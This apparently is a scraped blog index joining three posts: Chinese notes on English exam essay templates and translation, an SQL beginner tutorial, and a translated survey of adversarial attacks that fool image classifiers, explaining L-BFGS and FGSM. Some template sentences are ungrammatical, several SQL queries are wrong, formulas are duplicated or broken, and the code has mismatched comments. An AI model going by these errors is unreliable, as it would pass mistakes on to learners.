具体措施从：政府, 父母，学校，个人四方方面选两个方面去选 总结：It is really high time that due attention cannot have failed to paid to the issue about … 具体措施1：Parents are supposed to spend more time educating their kids to do sth eg. to be happy facing difficulties to put eggs in different baskets 具体措施2：Awareness about sth could be cultivated to make ourselves lead a healthy and favorable life. 喊口号：The more actively people face the issue, the more happily they will lead their life. ¶图画图表作文 第一段： 描述图画 （2句）+ 中心总结 （1句） 一二句主语从句描述图画 The majority of people would agree that sth has caused serious problems It is superficially a simple phenomenon, but when subjected to analysis, it has its fundamental reasons 然后总结图像中心思想： Simple as the cartoon looks, its meaning behind is really so far-reaching If you desire to do something great, you have to do it from small things. 第二段：举例 第三段：完全同谚语警句类作文 ¶论说文 第一段 引出主题 + 个人观点 （2句） What is your idea as to the topic about.? It is my belief that It looks beyond dispute that the issue about. has caused wide public attention. 第二段 举例 第三段 完全同谚语警句类作文 ¶我的模版 ¶论文文模版 It seems dispute that the issue about sth. It is my brief that … Although there are plentifully cases can support my view. To tell the truth, the following is most favorable. I have a friend. He has attended many competitions since he entered the university. … Nevertheless he became an outstanding student. We should learn from him. As everyone can see it, It is really high time that due attention cannot have failed to the issue about sth. Multitudes of teachers/parents are supposed to spend more time to educate their student. + 虚拟语气句. Awareness about sth. could be cultivated to make sb. lead a healthy and favorable life. The more actively people face the issue, the more happily they will lead their life. ¶翻译部分 10-12分： 译文基本上表达了原文的意思。文字通顺、连贯,无语言错误； 使用上位单词替换 使用同义词 用自己的话就行解释 大词随便写，小词就没看见 ¶英汉差异对比 汉语意合，英语形和 句子结构上：汉语没有主谓宾之分，汉语一定有主谓，主语一定是动作的发出者，宾语一定是动作的承受者 逻辑关系词的使用 and: similarly, equally but: nevertheless, by contrast Then: besides, moreover 英语多被动，汉语多主动 在过去几十年里,政府采取了各种措施防止灾害发生。 Various measures, in the past decades, have been taken to prevent disasters 那时,黄色是专为皇帝使用的颜色,皇家宮殿全都漆成黄色,皇袍总是 黄色的,而普通老百姓是禁止穿黄色衣服的。 At that time, yellow was designed to use for the emperor-the royal palace was painted yellow and the imperial robe was always yellow too. However, the ordinary people were not allowed to wear yellow clothes 最近,中国科学院( Chinese Academy of Sciences)出版了关于其最 新科学发现与末来一年展望的年度系列报告。 An annual report about its latest scientific findings and the prospect of the next year was recently published by Chinese Academy of Science 英语多长句 汉语多短句 短句写成长句的三种方式 非谓语动词 长江流经多种不同的生态系统,是诸多濒危物种的栖息地,灌溉了 中国五分之一的土地。(2017四级) The Yangzi River, flowing through different ecological systems keeps the habitat of plentiful endangered animals, irrigating one fifth of Chinese land. 乌镇是浙江的一座古老水镇,坐落在京杭大运河畔。这是一处迷人的地 方,有许多古桥、中式旅店和餐馆。 Wuzhen, an ancient water town of Zhejiang province, is located near the Beijing-hangzhou Grand Canal, which is really a charming place with many ancient bridges, Chinese style hotels and restaurants there. 并列的会写一个就够了； 从句 大熊猫是熊科中最罕见的成员,主要生活在中国西南部的森林里。 Pandas which mainly live in the forest of Southeast in China are the rarest members 中国人自古以来就在中秋节庆祝丰收,这与北美庆祝感恩节非常相似。 Chinese have had the tradition to celebrate harvest in the Middle-Autumn, which proves quite similar with Thanks-giving Day in North America 逻辑关系词 在过去一干年里,乌镇的水系和生活方式并未经历多少变化是一座展现古文明的博物馆。 In the past thousand years, the water system and the life way of Wuzhen have not gone through many changes. Therefore, it now is the museum to show anicent civilization. 这些资金用于改善教学设施、购买书籍,使16万多所中小学收益。资金还用于购 置音乐和绘画器材。现在农村和山区的儿童可以与沿海城市的儿童一样上音乐和 绘画课。(2014年四级) These funds are used to improve educational facilities, purchase books and more than 160 thousands primary schools and middle schools benefit from it. In addition, the fund is to be used for purchasing music and painting facilities. As a consequence, nowadays the children in the rurual areas can have the music and painting classes as the same as the children in the coastal cities do ¶翻译步骤 以意群为单位读句子，确定句子的时态 确定句子的主干，非主干的部分用定语和状语来修饰 每句话翻译完之后都要看该句话与下一句话的关系，从而加逻辑关系词 ¶传统阅读 时间： 8分钟 先读首段已经各段的第一句 顺序原则 ¶主旨题 无论题目问什么，选项里面和主题贴的最近的就是答案； ¶作者态度不选词 indifferent biased prejudiced detached neutral pessimistic subiective puzzled confused ¶答案分布 2233懂得都懂 ¶长篇阅读 看大标题和小标题，推测文章大概内容及作者态度 【中心词不能拿来定位】 找题干中的定位词，回头定位： 专有名词：时间 地点 人名 地名 国家名 固定概念：合成词 … 如果以上定位线索没有，则是： 常用动词、形容词、副词、极端词、最高级 重叠选项得出答案 注意 找出明显定位词后，最好阅读一下句子的意识，确认意思是不是现金 查漏补缺 找不到定位的就最后再做 读每段的重点句： 段首段尾句 段中转折词，因果词，递进关系词 作业： 整理模板把模板给背好，每5天写一篇作文和翻译 对于阅读题： 按照lxy的方法对每道题做 核实对错 精度全文 背不认识的单词和句子","categories":[],"tags":[{"name":"English","slug":"English","permalink":"http://blog.keter.top/tags/English/"}]},{"title":"【课程学习】SQL-Learning","slug":"SQL-Learning","date":"2021-03-02T06:01:02.000Z","updated":"2021-08-17T09:02:42.000Z","comments":true,"path":"2021/03/02/SQL-Learning/","link":"","permalink":"http://blog.keter.top/2021/03/02/SQL-Learning/","excerpt":"¶Mysql tutorial for beginners ¶Creating the Databases ¶The LIKE Operator Get all the custmers who’s patterns start with b/B 123SELECT *FROM customersWHERE last_name LIKE &#x27;b%&#x27; get all the custmers who’s last name start with brush 123SELECT *FROM customersWHERE last name LIKE &#x27;brush%&#x27; don’t care about the first character but the second character is y 123SELECT *FROM customersWHERE last name LIKE &#x27;_y&#x27; % : any number of characters _ : single character EXERCISE Get the customers whose addresses contain TRAIL or AVENUE 1234SELECT * FROM customersWHERE addresses LIKE &#x27;%trail%&#x27; OR addresses LIKE &#x27;%avenue%&#x27; Phone numbers end with 9 123SELECT *FROM customersWHERE phone LIKE &#x27;%9&#x27;","text":"¶Mysql tutorial for beginners ¶Creating the Databases ¶The LIKE Operator Get all the custmers who’s patterns start with b/B 123SELECT *FROM customersWHERE last_name LIKE &#x27;b%&#x27; get all the custmers who’s last name start with brush 123SELECT *FROM customersWHERE last name LIKE &#x27;brush%&#x27; don’t care about the first character but the second character is y 123SELECT *FROM customersWHERE last name LIKE &#x27;_y&#x27; % : any number of characters _ : single character EXERCISE Get the customers whose addresses contain TRAIL or AVENUE 1234SELECT * FROM customersWHERE addresses LIKE &#x27;%trail%&#x27; OR addresses LIKE &#x27;%avenue%&#x27; Phone numbers end with 9 123SELECT *FROM customersWHERE phone LIKE &#x27;%9&#x27; ¶The REGEXP Operator REGEXP: regular expression REGEXP is similar with LIKE Get all the customers who’s last name start with field 123SELECT *FROM customersWHERE last_name REGEXP &#x27;^field&#x27; Get all the customers who’s last name end with field 123SLECT * FROM customersWHERE last_name REGEXP &#x27;field$&#x27; Get all the customers who have words field,mac or rose in their last name 123SELECT *FROM customersWHERE last_name REGEXP &#x27;field|mac|rose&#x27; Get all the customers who have words ge,me or ie in their last name 123SELECT *FROM customersWHERE last_name REGEXP &#x27;[gim]e&#x27; ^ beginning $ end | logical or [abcd] [a-f] EXERCISE GET the customers whose first names are ELKA or AMBUR 123SELECT * FROM custmoersWHERE first_name REGEXP &#x27;elka|ambur&#x27; last names end with EY or ON 123SELECT *FROM customersWHERE last_name REGEXP &#x27;ey&lt;img src=&quot;https://www.zhihu.com/equation?tex=|on&quot; alt=&quot;&quot; style=&quot;margin: 0 auto;&quot; class=&quot;ee_img tr_noresize&quot; eeimg=&quot;1&quot;&gt;&#x27; Last names start with MY or contains SE 123SELECT *FROM customersWHERE last_name REGEXP &#x27;^my|se&#x27; last name contain B followed by R or U 123SELECT *FROM customersWHERE last_name REGEXP &#x27;b[ru]&#x27; ¶The IS NULL Operator search who does not have a phone 123SELECT *FROM customersWHERE phone IS NULL EXERCISE get the orders that are not shipped 123SEARCH *FROM ordersWHERE shipped_date IS NULL ¶The ORDER BY Clause In this tutor I’m going to show you how to sort data in your sequel queries Search customers order by first_name 123SELECT *FROM customersORDER BY first_name or you want to reverse the sort order 123SELECT *FROM customersORDER BY first_name DESC sort by multiple columns, for example 123SELECT *FROM customersORDER BY state,first_name; ¶The LIMIT Caluse get the first 3 customers 123SELECT *FROM customersLIMIT 300; Get customers form 6-9 123SELECT *FROM customersLIMIT 6,3; 6 is an offset, and 3 means the step EXERCISE Get the top three loyal customers 1234SELECT *FROM customersORDER BY points DESCLIMIT 3; ¶The Inner loins JOIN is equal with INNER JOIN , we don’t have to type it. you can use JOIN to catch the relation between to tables; For example, you want to search orders which have the same customer_id in table CUSTOMERS from the table ORDERS. 1234SELECT *FROM ordersJOIN customers ON orders.customer_id = customers.customer_id we can use alias to simplify the query. 1234SELECT *FROM orders oJOIN customers c ON o.customer_id = c.customer_id if we use o as the orders’s alias , we can’t write orders to instead o in the next. ¶Joining Across Databases how to combine columns from tables in multiple databases ? Using database combines with sql_inventory database. 1234SELECT *FROM order_items oiJOIN sql_inventory.products p ON oi.product_id = p.product_id; the query will be different depending on the database ¶Self Joins In sql we can join tables with itself. In database sql_hr we have a table named employees. Now we need select each employee and their manager. 123456USE sql_hr;SELECT *FROM employees eJOIN employees m On e.reports_to = m.employee_id ¶Joining Multiple Tables 1234567891011SELECT o.order_id, o.order_data, c.first_name, c.last_name, os.name AS statusFROM order oJOIN customers c ON o.customers_id = c.customer_idJOIN order_statuses os ON o.status = os.order_status_id Exercise In database sql_invoicing we have this table, payments and these are the payments that each client has made towards either invoice. We also have a table named payment_methods. Write a query that join the payments with the payment methods tables as well as the clients table.Produce a report that shows the payments, with more details, such as the name of the client and the payment method. 1234567891011SELECT p.data, p.invoice_id, p.amount, c.name, pm.name,FROM payments pJOIN clients c ON p.client_id = c.client_idJOIN payment_methods pm ON p.payment_method = pm.payment_method_id ¶Compound Join Conditions we have mutiple conditions to join these two tables e.g. 12345SELECT * FROM order_items oiJOIN oder_item_notes oin ON oi.order_id = oin.order_id AND oi.product_id = oin.product_id; ¶Implicit Join Syntax In Mysql we can use simple query to instead Join condition. for example 123456789SELECT *FROM orders oJOIN customers c ON o.customer_id = c.customer_id -- Implpicit Join SyntaxSELECT *FROM orders o,customers cWHERE o.customer_id = c.customer_id","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"数据库","slug":"课程学习/数据库","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"数据库","slug":"数据库","permalink":"http://blog.keter.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"「论文阅读」神经对抗攻击综述论文","slug":"【论文阅读】神经对抗攻击综述论文","date":"2021-01-20T06:01:02.000Z","updated":"2021-09-22T04:10:38.487Z","comments":true,"path":"2021/01/20/【论文阅读】神经对抗攻击综述论文/","link":"","permalink":"http://blog.keter.top/2021/01/20/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91%E7%A5%9E%E7%BB%8F%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E7%BB%BC%E8%BF%B0%E8%AE%BA%E6%96%87/","excerpt":"神经对抗攻击综述论文：Threat of Adversarial Attacks on Deep Learning in Computer Vision: A Survey 论文地址：https://arxiv.org/abs/1801.00553 这是一篇神经对抗的综述文章，非常非常非常详细的介绍了当前神经对抗攻击的发展情况和已有的攻击和防御算法。本篇博客主要对文章进行翻译，还加入了个人对一些算法的理解与解释。这篇文章我大概看了一个星期。真的是一篇非常不错的综述论文。 最近的研究表明，它们很容易受到对抗性攻击，因为输入的细微扰动会导致模型预测不正确的输出。 对于图像来说，这样的扰动往往太小而难以察觉，但它们完全欺骗了深度学习模型 ¶Inroduction 尽管深度学习以非凡的准确性执行各种各样的计算机视觉任务，Szegedy等人[22]首先发现了深度神经网络在图像分类背景下的一个有趣的弱点。他们发现，尽管现代深度网络的准确性很高，但却令人惊讶地容易受到对抗性攻击，这种攻击的形式是对人类视觉系统(几乎)察觉不到的图像的微小干扰。 即使是3d打印现实世界的物体也可以欺骗深度神经网络分类器 在第2节中，我们首先用计算机视觉的说法描述了与对抗性攻击有关的常见术语。在第3节，我们回顾了对抗性攻击任务的图像分类和超越。一个单独的部分是奉献给处理对抗攻击的方法在现实世界的条件。第4节将审查这些方法。在文献中，也有主要分析对抗性攻击存在性的著作。我们将在第5节讨论这些贡献。防御对手攻击的方法是","text":"神经对抗攻击综述论文：Threat of Adversarial Attacks on Deep Learning in Computer Vision: A Survey 论文地址：https://arxiv.org/abs/1801.00553 这是一篇神经对抗的综述文章，非常非常非常详细的介绍了当前神经对抗攻击的发展情况和已有的攻击和防御算法。本篇博客主要对文章进行翻译，还加入了个人对一些算法的理解与解释。这篇文章我大概看了一个星期。真的是一篇非常不错的综述论文。 最近的研究表明，它们很容易受到对抗性攻击，因为输入的细微扰动会导致模型预测不正确的输出。 对于图像来说，这样的扰动往往太小而难以察觉，但它们完全欺骗了深度学习模型 ¶Inroduction 尽管深度学习以非凡的准确性执行各种各样的计算机视觉任务，Szegedy等人[22]首先发现了深度神经网络在图像分类背景下的一个有趣的弱点。他们发现，尽管现代深度网络的准确性很高，但却令人惊讶地容易受到对抗性攻击，这种攻击的形式是对人类视觉系统(几乎)察觉不到的图像的微小干扰。 即使是3d打印现实世界的物体也可以欺骗深度神经网络分类器 在第2节中，我们首先用计算机视觉的说法描述了与对抗性攻击有关的常见术语。在第3节，我们回顾了对抗性攻击任务的图像分类和超越。一个单独的部分是奉献给处理对抗攻击的方法在现实世界的条件。第4节将审查这些方法。在文献中，也有主要分析对抗性攻击存在性的著作。我们将在第5节讨论这些贡献。防御对手攻击的方法是 ¶在adversarial attack中的常用术语 Adversarial example/image ：被故意扰乱的干净图像的修改版本. Threat model ：指一种方法所考虑的潜在攻击类型，例如黑盒攻击. Universal perturbation : 可以大概率干扰任何一张图片识别结果的干扰 White-box attacks ：在知道目标模型的完整知识，包括它的参数值、架构、训练方法，在某些情况下还有它的训练数据的情况下进行攻击. Adversarial perturbation ：被加在原图像上的噪声使原图像成为对抗样本 Adversarial training ：使用对抗图像样本来进行训练 Adversary ：一般指创造对抗样本的人，有时候样本本身也叫做这个 Black-box attacks ：测试过程中，在不了解该模型的情况下，为目标模型提供生成的实例的攻击. Fooling ratio/rate ：表示经过训练的模型在图像被扰动后改变其预测标签的百分比 One-shot/one-step methods ：通过执行一步计算产生一个对抗性的扰动，如一次计算模型损失梯度。与之相反的是迭代方法，即多次执行相同的计算以获得单个扰动。 Quasi-imperceptible ：对于人类的感知来说，干扰对图像的影响非常轻微。 Rectifier ：修改一个对抗性的示例，以将目标模型的预测恢复为同一示例的干净版本上的预测。 Targeted attacks ：骗过一个模型，让它错误地预测出敌对形象的特定标签。 ¶3. 神经对抗攻击 第三节中论文主要分为两大部分来进行介绍 在第3.1部分中，我们回顾了攻击深度神经网络的方法，这些方法执行计算机视觉中最常见的任务，即分类/识别。在第3.2部分中讨论了主要用于攻击深度学习的方法。 ¶3.1 Attacks for classification ¶3.1.1 Box-constrained L-BFGS Szegedy等人首先证明了图像存在小扰动，如扰动图像可以欺骗深度学习模型，使其误分类。设Ic∈Rm表示一个向量化的干净图像——下标‘c’强调该图像是干净的。为了计算一个可加性扰动ρ∈Rm，它会对图像产生非常轻微的扭曲，从而欺骗网络，Szegedy等人提出解决问题的公式: min⁡ρ∥ρ∥2 s.t. C(Ic+ρ)=ℓ;Ic+ρ∈[0,1]m&quot;\\min _{\\boldsymbol{\\rho}}\\|\\boldsymbol{\\rho}\\|_{2} \\text { s.t. } \\mathcal{C}\\left(\\mathbf{I}_{c}+\\boldsymbol{\\rho}\\right)=\\ell ; \\mathbf{I}_{c}+\\boldsymbol{\\rho} \\in[0,1]^{m}&quot; ρmin​∥ρ∥2​ s.t. C(Ic​+ρ)=ℓ;Ic​+ρ∈[0,1]m&quot; 其中C(Ic+ρ)=ℓ\\mathcal{C}\\left(\\mathbf{I}_{c}+\\boldsymbol{\\rho}\\right)=\\ellC(Ic​+ρ)=ℓ: min⁡ρc∣ρ∣+L(Ic+ρ,ℓ) s.t. Ic+ρ∈[0,1]m\\min _{\\boldsymbol{\\rho}} c|\\boldsymbol{\\rho}|+\\mathcal{L}\\left(\\mathbf{I}_{c}+\\boldsymbol{\\rho}, \\ell\\right) \\text { s.t. } \\mathbf{I}_{c}+\\boldsymbol{\\rho} \\in[0,1]^{m}minρ​c∣ρ∣+L(Ic​+ρ,ℓ) s.t. Ic​+ρ∈[0,1]m ; L(.,.)\\mathcal{L}(., .)L(.,.)计算分类器的损失。我们注意到上式使得具有凸损失函数的分类器具有精确的结果。然而，对于深度神经网络来说，情况通常不是这样。计算的扰动只是添加到图像，使它成为一个对抗的例子。 上述方法能够计算当将噪声添加到干净图像时对神经网络的扰动，但是对抗性图像看起来与人类视觉系统的干净图像相似。Szegedy等人观察到一个神经网络计算的扰动也能够欺骗多个网络。这些惊人的结果发现了深度学习中的一个盲点。在这个发现的时候，计算机界正在迅速适应这样一种印象：深度学习特征定义了一个空间，在这个空间中，感知距离可以很好地近似于欧几里德距离。因此，这些相互矛盾的结果引发了研究人员对计算机视觉深度学习对抗性攻击的广泛兴趣。 ¶补充说明：L-BFGS算法 参考博客链接：https://blog.csdn.net/weixin_39445556/article/details/84502260 我们知道算法在计算机中运行的时候是需要很大的内存空间的.就像我们解决函数最优化问题常用的梯度下降,它背后的原理就是依据了泰勒一次展开式.泰勒展开式展开的次数越多,结果越精确,没有使用三阶四阶或者更高阶展开式的原因就是目前硬件内存不足以存储计算过程中演变出来更复杂体积更庞大的矩阵.L-BFGS算法翻译过来就是有限内存中进行BFGS算法,L是limited memory的意思. 算法为什么叫做BFGS呢？这就是四个数学家名字的简称而已，不用过多的在意 学习BFGS必须要先了解牛顿法的求根问题. 牛顿法求根问题 牛顿发现,一个函数的根从物理的角度就可以根据函数图像迭代求得.牛顿法求根的思路是: a. 在X轴上随机一点x1,经过x1做X轴的垂线,得到垂线与函数图像的交点f（x1） b. 通过f（x1）做函数的切线,得到切线与X轴的交点x2 c. 迭代a/b两步. 下面附上一张动图方便理解: 通过图片我们可以看到.在X轴上取的点会随着迭代次数的增加而越来越接近函数的根.经过无限多次的迭代$f(x)&quot;$的根. 那么问题来了,怎么样找到$f(x)&quot;$的导函数与X轴的交点.请看下图: . 图片是上边动图从f′(x)=f(x1)x1−x2&quot;f^{&#x27;}(x) = \\frac{f(x_{1})}{x_{1} - x_{2}}&quot;f′(x)=x1​−x2​f(x1​)​&quot; (公式一). 公式一变换一下得到: xk=xk−1−f(xk−1)f′(xk−1)&quot;x_{k} =x_{k-1} - \\frac{ f(x_{k-1})}{f^{&#x27;}(x_{k-1})}&quot;xk​=xk−1​−f′(xk−1​)f(xk−1​)​&quot; (公式三). 所以,根据牛顿法求根的思路,我们可以总结(模仿)一下使用牛顿法求根的步骤: a.已知函数f(x)的情况下,随机产生点x0&quot;x_{0}&quot;x0​&quot;. b.由已知的xk=xk−1−f(xk−1)f′(xk−1)&quot;x_{k} =x_{k-1} - \\frac{ f(x_{k-1})}{f^{&#x27;}(x_{k-1})}&quot;xk​=xk−1​−f′(xk−1​)f(xk−1​)​&quot;的公式进行k次迭代. c.如果xk&quot;x_{k}&quot;xk​&quot;就是函数f(x)的根. 以上为牛顿法的求根的思路. 牛顿法求函数的驻点 我们知道,机器学习过程中的函数最优化问题,大部分优化的都是目标函数的导函数,我们要求得导函数为零时的点或近似点来作为机器学习算法表现最好的点.现在我们知道了牛顿求根法,那把牛顿求根法的函数换成咱们要优化的导函数不就行了么.要求的的导函数为零的点叫做驻点.所以用牛顿法求函数驻点同求函数的根是没有任何区别的.只是公式二中的xk&quot;x_{k}&quot;xk​&quot;的迭代公式如下: xk=xk−1−f′(xk−1)f′′(xk−1)&quot;x_{k} = x_{k-1} - \\frac{f^{&#x27;}(x_{k-1})}{f^{&#x27;&#x27;}(x_{k-1})}&quot;xk​=xk−1​−f′′(xk−1​)f′(xk−1​)​&quot; (公式四) 这样,我们通过几何直觉,得到了求解函数根的办法,那这么厉害的一个想法,有没有什么理论依据作为支撑呢?当然有了,要不我也不这么问. 牛顿法求驻点的本质 牛顿法求驻点的本质其实是二阶泰勒展开.我们来看二阶泰勒展开式: φ(x)=f(xk)+f′(xk)(x−xk)+12f′′(xk)(x−xk)2\\varphi(x)=f\\left(x_{k}\\right)+f^{\\prime}\\left(x_{k}\\right)\\left(x-x_{k}\\right)+\\frac{1}{2} f^{\\prime \\prime}\\left(x_{k}\\right)\\left(x-x_{k}\\right)^{2}φ(x)=f(xk​)+f′(xk​)(x−xk​)+21​f′′(xk​)(x−xk​)2 φ(x)&quot;\\varphi (x)&quot;φ(x)&quot;求导,消去常数项后得到公式如下: f′(xk)+f′′(xk)(x−xk)=0&quot;f^{\\prime}\\left(x_{k}\\right)+f^{\\prime \\prime}\\left(x_{k}\\right)\\left(x-x_{k}\\right)=0&quot;f′(xk​)+f′′(xk​)(x−xk​)=0&quot; 经过变换后所得的公式就是上边的公式四.所以,牛顿法求驻点的本质就是对函数进行二阶泰勒展开后变换所得到的结果. 在一元函数求解的问题中,我们可以很愉快的使用牛顿法求驻点,但我们知道,在机器学习的优化问题中,我们要优化的都是多元函数,所以x往往不是一个实数,而是一个向量.所以将牛顿求根法利用到机器学习中时,x是一个向量,f′′(x)&quot;f^{&#x27;&#x27;}(x)&quot;f′′(x)&quot;是一个矩阵,叫做Hessian矩阵.等价公式如下: xk+1=xk−Hk−1⋅gk,k=0,1,⋯\\mathbf{x}_{k+1}=\\mathbf{x}_{k}-H_{k}^{-1} \\cdot \\mathbf{g}_{k}, \\quad k=0,1, \\cdotsxk+1​=xk​−Hk−1​⋅gk​,k=0,1,⋯ 公式中,f′(x),Hk−1f^{&#x27;}(x),H_{k}^{-1}f′(x),Hk−1​代表二阶导函数的倒数. 当x的维度特别多的时候,我们想求得f′′(x)&quot;f^{&#x27;&#x27;}(x)&quot;f′′(x)&quot;是非常困难的.而牛顿法求驻点又是一个迭代算法,所以这个困难我们还要面临无限多次,导致了牛顿法求驻点在机器学习中无法使用.有没有什么解决办法呢? BFGS算法 BFGS算法是通过迭代来逼近Hk−1&quot;H_{k}^{-1}&quot;Hk−1​&quot;的算法.逼近的方式如下(公式五): Dk+1=(I−εkykTykTsk)Dk(I−ysskTykTsk)+sksTykTskD_{k+1}=\\left(I-\\frac{\\varepsilon_{k} \\mathbf{y}_{k}^{T}}{\\mathbf{y}_{k}^{T} \\mathbf{s}_{k}}\\right) D_{k}\\left(I-\\frac{\\mathbf{y}_{\\mathbf{s}} \\mathbf{s}_{k}^{T}}{\\mathbf{y}_{k}^{T} \\mathbf{s}_{k}}\\right)+\\frac{\\mathbf{s}_{k} \\mathbf{s}^{T}}{\\mathbf{y}_{k}^{T} \\mathbf{s}_{k}}Dk+1​=(I−ykT​sk​εk​ykT​​)Dk​(I−ykT​sk​ys​skT​​)+ykT​sk​sk​sT​ 公式五中的 gk&quot;g_{k}&quot;gk​&quot;是原函数的导函数. Hk−1&quot;H_{k}^{-1}&quot;Hk−1​&quot;矩阵,第一步的D矩阵是单位矩阵. 我们要通过牛顿求驻点法和BFGS算法来求得一个函数的根,两个算法都需要迭代,所以我们干脆让他俩一起迭代就好了.两个算法都是慢慢逼近函数根,所以经过k次迭代以后,所得到的解就是机器学习中目标函数导函数的根.这种两个算法共同迭代的计算方式,我们称之为On The Fly.个人翻译:让子弹飞~ 回顾一下梯度下降的表达式Θk=Θk+1−α⋅g&quot;\\Theta_{k} = \\Theta_{k+1} - \\alpha \\cdot g&quot;Θk​=Θk+1​−α⋅g&quot; ,在BFGS算法迭代的第一步,单位矩阵与梯度g相乘,就等于梯度g,形式上同梯度下降的表达式是相同的.所以BFGS算法可以理解为从梯度下降逐步转换为牛顿法求函数解的一个算法. 虽然我们使用了BFGS算法来利用单位矩阵逐步逼近H矩阵,但是每次计算的时候都要存储D矩阵,D矩阵有多大呢.假设我们的数据集有十万个维度(不算特别大),那么每次迭代所要存储D矩阵的结果是74.5GB.我们无法保存如此巨大的矩阵内容,如何解决呢? 使用L-BFGS算法. L-BFGS算法: 我们每一次对D矩阵的迭代,都是通过迭代计算y10&quot;y_{10}&quot;y10​&quot;计算就可以了.这样一个时间换空间的办法可以让我们在数据集有10000个维度的情况下,由存储10000 x 10000的矩阵变为了存储十个1 x 10000的10个向量,有效节省了内存空间. 但是,仅仅是这样还是不够的,因为当迭代次数非常大的时候,我们的内存同样存不下.这个时候只能丢掉一些存不下的数据.假设我们设置的存储向量数为100,当s和y迭代超过100时,就会扔掉第一个s和y,存储s_{2}到s_{101}和y_{2}到y_{101},每多一次迭代就对应的扔掉最前边的s和y.这样虽然损失了精度,但确可以保证使用有限的内存将函数的解通过BFGS算法求得到. 所以L-BFGS算法可以理解为对BFGS算法的又一次近似. ¶3.1.2 Fast Gradient Sign Method (FGSM) FGSM是一种白盒攻击； Szegedy等人[22]观察到，对抗性训练可以提高深层神经网络对对抗性例子的鲁棒性。（对抗性训练就是指将生成的对抗性样本加入到训练集当中来进行进一步的训练） 为了实现有效的对抗性训练，Goodfello等人[23]开发了通过解决以下问题，有效计算给定图像的对抗性扰动的方法： ρ=ϵsign⁡(∇J(θ,Ic,ℓ))\\rho=\\epsilon \\operatorname{sign}\\left(\\nabla \\mathcal{J}\\left(\\boldsymbol{\\theta}, \\mathbf{I}_{c}, \\ell\\right)\\right)ρ=ϵsign(∇J(θ,Ic​,ℓ)) ϵ&quot;\\epsilon&quot;ϵ&quot;是限制微扰范数的小标量值。这种方法叫做FGSM（Fast Gradient Sign Method）算法。 有趣的是，FGSM产生的对抗性例子利用了高维空间中深层网络模型的“线性”，而这种模型当时通常被认为是高度非线性的。古德费罗等人[23]假设，现代深层神经网络的设计（有意）为计算增益引入线性行为，也使它们容易受到廉价的分析扰动。在相关文献中，这一观点通常被称为“线性假设”，这一点得到了FGSM方法的证实。 FGSM对图像进行扰动，以增加分类器在结果上的损失。sign函数保证了损失大小最大化，而ε本质上限制了ℓ∞&quot;\\ell_{\\infty}&quot;ℓ∞​&quot; -norm的扰动。Miyato等人[103]提出的计算方法，如下所示： ρ=ϵ∇J(θ,Ic,ℓ)∥∇J(θ,Ic,ℓ)∥2\\boldsymbol{\\rho}=\\epsilon \\frac{\\nabla \\mathcal{J}\\left(\\boldsymbol{\\theta}, \\mathbf{I}_{c}, \\ell\\right)}{\\left\\|\\nabla \\mathcal{J}\\left(\\boldsymbol{\\theta}, \\mathbf{I}_{c}, \\ell\\right)\\right\\|_{2}} ρ=ϵ∥∇J(θ,Ic​,ℓ)∥2​∇J(θ,Ic​,ℓ)​ 在上面的方程中，计算的梯度用ℓ∞\\ell_{\\infty}ℓ∞​”方法。从广义上讲，在计算机视觉对抗性攻击的相关文献中，所有这些方法都被叫做 ‘one-step’ or ‘one-shot’ “一步式”或“一次性”方法。 补充说明：FGSM算法 参考文章： 干货 | 攻击AI模型之FGSM算法 FGSM最早由Goodfellow在其论文《Explaining and Harnessing Adversarial Examples》[23] 中提出。以最常见的图像识别为例，我们希望在原始图片上做肉眼难以识别的修改，但是却可以让图像识别模型产生误判。假设图片原始数据为x，图片识别的结果为y，原始图像上细微的变化肉眼难以识别，使用数学公式表示如下。 x~=x+η&quot;\\widetilde{x}=x+\\eta&quot;x=x+η&quot; 将修改后的图像输入分类模型中，x与参数矩阵相乘。 wTx~=wTx+wTη&quot;w^{T} \\widetilde{x}=w^{T} x+w^{T} \\eta&quot;wTx=wTx+wTη&quot; 对分类结果的影响还要受到激活函数的作用，攻击样本的生成过程就是追求以微小的修改，通过激活函数的作用，对分类结果产生最大化的变化。Goodfellow指出，如果我们的变化量与梯度的变化方向完全一致，那么将会对分类结果产生最大化的变化。 η=ϵsign⁡(grad⁡(w,x,y))&quot;\\eta=\\operatorname{\\epsilon sign}(\\operatorname{grad}(w, x, y))&quot;η=ϵsign(grad(w,x,y))&quot; 其中sign函数可以保证变化量与梯度函数方向一致。 当x的维数为n时，模型的参数在每个维度的平均值为m，每个维度的微小修改与梯度函数方向一致，累计的效果为： mnϵ&quot;mn \\epsilon&quot;mnϵ&quot; 可见当原始数据的维度越大，攻击的累计效果越明显。以一个更加直观的例子来说明FGSM的原理。 假设具有2000个样本，每个数据具有1000维，每维的数据的数值的大小都在0-1之间随机生成，分类标签只有2种。 123456789101112131415import tensorflow as tffrom tensorflow.keras import *print(tf.__version__)print(tf.test.is_gpu_available())import sklearnfrom sklearn.preprocessing import MinMaxScaler# feather numbern_features = 1000x,y=datasets.make_classification(n_samples=2000, n_features=n_features, n_classes=2, random_state=random_state)# Standardized to 0-1x = MinMaxScaler().fit_transform(x) 分类模型是一个非常简单的神经网络，输入层大小为1000，输出层为1，激活函数为sigmoid。 1model = tf.keras.models.Sequential([layers.Dense(1,activation=&#x27;sigmoid&#x27;)]) sigmoid函数是非常经典的激活函数，取值范围为0-1，特别适合表示概率分布。 损失函数使用最简单的mse，优化方式使用adam，考核的指标为准确度accuracy。 12345678model.compile(loss=&#x27;mse&#x27;,optimizer=&#x27;adam&#x27;,metrics=[&#x27;accuracy&#x27;])model.fit( #使用model.fit()方法来执行训练过程， x, y, #告知训练集的输入以及标签， batch_size = 16, #每一批batch的大小为32， epochs = 50, #迭代次数epochs为500 validation_split = 0.2, #从测试集中划分80%给训练集 validation_freq = 10 #测试的间隔次数为20) 批处理大小为16，经过50轮训练。 12model.fit(x_train, y_train, validation_data=(x_val, y_val), epochs=100) 